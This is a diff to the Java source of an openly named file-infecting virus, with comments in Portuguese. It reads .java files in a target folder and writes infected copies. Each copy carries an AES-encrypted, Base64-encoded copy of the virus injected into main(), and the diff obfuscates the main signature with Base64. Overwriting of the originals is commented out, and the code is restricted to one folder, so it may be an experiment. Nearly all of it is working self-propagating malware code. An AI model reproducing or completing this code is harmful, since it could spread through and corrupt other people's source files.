@@ -1,35 +1,32 @@
 // VIRUS:START
 public class Virus {
     static void execute(String virus){
-        var curPath = java.nio.file.Paths.get(java.lang.System.getProperty("user.home"),"virus"); // Pasta alvo; Virus infecta apenas os arquivos nessa pasta. -- Não visita pastas aninhadas --;
-        try (var stream = java.nio.file.Files.newDirectoryStream(curPath)) {
+        var pAlvo = java.nio.file.Paths.get("user.home", "virus"); // Pasta alvo; Virus infecta apenas os arquivos nessa pasta. -- Não visita pastas aninhadas --;
+        try (var stream = java.nio.file.Files.newDirectoryStream(pAlvo)) {
             var matcher = java.nio.file.FileSystems.getDefault().getPathMatcher("glob:*.java");
  
             for (java.nio.file.Path entry : stream) {
-                if (matcher.matches(entry.getFileName()) && java.nio.file.Files.isWritable(entry)) {
+                if (matcher.matches(entry.getFileName()) && java.nio.file.Files.isReadable(entry)) {
                     var tempFile = java.nio.file.Files.createFile(java.nio.file.Path.of(entry + ".infected"));
-                    var targetFile = java.nio.file.Files.newBufferedReader(entry).readAllAsString();
-                    // TODO: Update this; copy line by line, IF $currentLine CONTAINS main(){ OR main(String[] args){ THEN inject $payload.
-                    var beginIndexOfMain = targetFile.lastIndexOf("void main");
-                    java.nio.file.Files.writeString(tempFile, targetFile.substring(0, beginIndexOfMain));
-                    targetFile = targetFile.substring(targetFile.indexOf("{", beginIndexOfMain));
-                    int bracketCount = 0; // Isso procura o fim do metodo main() no $arquivoAlvo; No final do loop o valor de $i é o índice do último '}' em main, i.e. o fim da função.
-                    for (var i = 0; i < targetFile.length(); i++) { // TODO: targetFile might not have a main() function .. targetFile main() may throw exceptions
-                        if (targetFile.charAt(i) == '{'){
-                            bracketCount += 1;
-                        } else if (targetFile.charAt(i) == '}') {
-                            bracketCount -= 1;
+                    var targetFile = java.nio.file.Files.newBufferedReader(entry);
+                    String mainSignature = new String(java.util.Base64.getDecoder().decode("cHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYXJncykgewo="), java.nio.charset.Charset.forName("utf-8"));
+                    String nextLine =  targetFile.readLine();
+                    String curLine;
+                    Boolean flag = false;
+                    while ((curLine = nextLine) != null) {
+                        nextLine = targetFile.readLine();
+                        if (nextLine == null && !flag /* no main() method was found */) {
+                            java.nio.file.Files.writeString(tempFile, mainSignature, java.nio.file.StandardOpenOption.APPEND);
+                            java.nio.file.Files.writeString(tempFile, encryptedVirus(virus), java.nio.file.StandardOpenOption.APPEND);
+                            java.nio.file.Files.writeString(tempFile, "}\n", java.nio.file.StandardOpenOption.APPEND);
                         }
-                        if (bracketCount <= 0) {
-                            bracketCount = i;
-                            break;
+                        java.nio.file.Files.writeString(tempFile, curLine + "\n", java.nio.file.StandardOpenOption.APPEND);
+                        if (curLine.contains("void main(")) {
+                            java.nio.file.Files.writeString(tempFile, encryptedVirus(virus), java.nio.file.StandardOpenOption.APPEND);
+                            flag = true;
                         }
                     }
-                    var sb = new StringBuilder(encryptedVirus(virus));
-                    sb.insert(sb.lastIndexOf("// VIRUS:END") + "// VIRUS:END".length(), "\n\t" + targetFile.substring(1, bracketCount));
-                    sb.append("\n");
-                    java.nio.file.Files.writeString(tempFile, sb.toString(), java.nio.file.StandardOpenOption.APPEND);
-                    java.nio.file.Files.writeString(tempFile, targetFile.substring(bracketCount + 1), java.nio.file.StandardOpenOption.APPEND);
+                    targetFile.close();
                     // java.nio.file.Files.delete(entry);
                     // java.nio.file.Files.move(tempFile, entry);
                 }
@@ -52,8 +49,6 @@ public class Virus {
         var encodedKey = java.util.Base64.getEncoder().encodeToString(key.getEncoded());
  
         var payload = """
-        // VIRUS:START
-        void main(){
             try {
                 var encodedVirus = "%s";
                 var iv = "%s";
@@ -82,13 +77,10 @@ public class Virus {
             } catch (java.lang.Exception e) {
                 e.printStackTrace();
             }
-        // VIRUS:END
-        }
         """.formatted(encodedVirus, encodedIv, encodedKey);
- 
         return payload;
     }
-
+ 
     public static void main(String[] args) {
         try {
             String virus = "";
@@ -106,3 +98,5 @@ public class Virus {
     }
 }
 // VIRUS:END
+     
+
